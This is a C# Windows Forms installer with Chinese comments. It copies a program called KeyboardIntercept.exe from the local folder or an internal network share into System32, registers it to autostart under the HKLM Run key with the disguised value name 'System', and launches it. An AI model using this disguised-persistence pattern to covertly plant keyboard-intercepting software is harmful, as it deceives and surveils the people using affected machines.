using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.IO;
using Microsoft.Win32;

namespace ForInstall
{
    public partial class ForInstall : Form
    {
        public ForInstall()
        {
            InitializeComponent();
        }
        //////////////////////////
        ////////参数定义区域///////
        //////////////////////////
        string para_sharedIP = "10.16.139.81"; //共享服务器IP地址
        string para_netLoginPath = " use \\\\10.16.139.81\\Shared  /user:\"User\" \"Passwd\"";  //共享服务器的共享登录信息
        string para_netMainProgramFilePath = @"\\10.16.139.81\Shared\KeyboardIntercept.exe"; //共享服务器中主程序路径
        string para_localMainProgramFilePath = "C:\\Windows\\System32\\KeyboardIntercept.exe";  //本地主程序将要存储的路径
        string para_MainProgramFileName = "KeyboardIntercept.exe";  //主程序exe设定的全名称
        int para_currentNetwork = 0;
        //////////////////////////
        ////////参数定义区域///////
        //////////////////////////
        private void BTN_Install_Click(object sender, EventArgs e)
        {
            string localMainProgramFile = System.Environment.CurrentDirectory + para_MainProgramFileName;
            if (File.Exists(localMainProgramFile)) {
                try {
                    File.Copy(localMainProgramFile, para_localMainProgramFilePath, true);
                    Notice.Text = "本地程序拷贝成功,将开始配置.";
                    Boolean writeOrNot = writeIntoRegedit("System", para_localMainProgramFilePath);
                    if (writeOrNot)
                    {
                        System.Diagnostics.Process.Start(para_localMainProgramFilePath);
                        Notice.Text = "安装成功,配置成功.";
                    }
                    else { Notice.Text = "配置失败,请联系管理员!"; }
                    return;
                }
                catch (IOException ex)
                { //System.Console.WriteLine(ex.ToString()); 
                    Notice.Text = "本地程序拷贝失败,将要启动远程拷贝功能.";
                    return;
                }
            }
            networkStatusJudge(para_sharedIP);
            if (para_currentNetwork == 1)
            {
                try {
                    System.Diagnostics.Process.Start("net.exe", para_netLoginPath);
                    if (File.Exists(para_netMainProgramFilePath))
                    {
                        File.Copy(para_netMainProgramFilePath, para_localMainProgramFilePath, true);
                        Notice.Text = "远程文件拷贝成功,将要开始配置.";
                        Boolean writeOrNot = writeIntoRegedit("System", para_localMainProgramFilePath);
                        if (writeOrNot)
                        {
                            System.Diagnostics.Process.Start(para_localMainProgramFilePath);
                            Notice.Text = "安装成功,配置成功.";
                        }
                    }
                    else {
                        Notice.Text = "配置失败,请联系管理员!";
                        return;
                    }
                }catch(IOException ex){
                    System.Console.WriteLine(ex.ToString());
                }
            }
            else {
                Notice.Text = "程序安装失败,请检查网络状态。";
                //System.Console.WriteLine("File is no exists , Please Contact Administrator");
            }
        }
        /// <summary>
        /// 将程序在注册中设置为自动启动
        /// </summary>
        /// <param name="keyName"></param>
        /// <param name="keyValue"></param>
        /// <returns></returns>
        private bool writeIntoRegedit(string keyName, string keyValue)
        {
            RegistryKey regKey = Registry.LocalMachine;
            Boolean itemExist = isRegeditItemExist(@"SOFTWARE\Microsoft\Windows\CurrentVersion","Run");
            if (itemExist == true) {
                itemExist = isRegeditKeyExist(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run","System");
                if (itemExist == true)
                {
                    RegistryKey delAddKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    delAddKey.DeleteValue("System");
                    delAddKey.SetValue("System", para_localMainProgramFilePath);
                    delAddKey.Close();
                }
                else {
                    RegistryKey delAddKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    delAddKey.SetValue("System", para_localMainProgramFilePath);
                    delAddKey.Close();
                }
                return true;
            }
            return false;
        }
        /// <summary>
        /// 判断注册表目录项是否存在
        /// </summary>
        /// <param name="regeditPath"></param>
        /// <param name="regeditItem"></param>
        /// <returns></returns>
        private bool isRegeditItemExist(string regeditPath,string regeditItem)
        {
            string[] subkeyNames;
            RegistryKey hkml = Registry.LocalMachine;
            RegistryKey CurrentVersion = hkml.OpenSubKey(regeditPath);
            //RegistryKey software = hkml.OpenSubKey("SOFTWARE", true);
            subkeyNames = CurrentVersion.GetSubKeyNames();
            //取得该项下所有子项的名称的序列，并传递给预定的数组中
            foreach (string keyName in subkeyNames)  //遍历整个数组
            {
                if (keyName == regeditItem) //判断子项的名称
                {
                    hkml.Close();
                    return true;
                }
            }
            hkml.Close();
            return false;
        }
        /// <summary>
        /// 判断注册表指定目录中的指定字段值是否存在
        /// </summary>
        /// <param name="regeditPath"></param>
        /// <param name="regeditItem"></param>
        /// <returns></returns>
        private bool isRegeditKeyExist(string regeditPath, string regeditItem)
        {
            string[] subkeyNames;
            RegistryKey hkml = Registry.LocalMachine.OpenSubKey(regeditPath);
            //RegistryKey software = hkml.OpenSubKey("SOFTWARE\\Run", true);
            subkeyNames = hkml.GetValueNames();
            //取得该项下所有键值的名称的序列，并传递给预定的数组中
            foreach (string keyName in subkeyNames)
            {
                if (keyName == regeditItem)  //判断键值的名称
                {
                    hkml.Close();
                    return true;
                }
            }
            hkml.Close();
            return false;
        }
        /// <summary>
        /// 判断网络状况
        /// </summary>
        /// <param name="parain_IP"></param>
        private void networkStatusJudge(string parain_IP)
        {
            Ping ping = new Ping();
            PingReply pingReply = ping.Send(parain_IP);
            if (pingReply.Status == IPStatus.Success) {
                //Console.WriteLine("OnLine,ping Success!");
                para_currentNetwork = 1;
            }
            else {
                //Console.WriteLine("Offline，ping Failed!");
                para_currentNetwork = 0;
            }
        }
    }
}
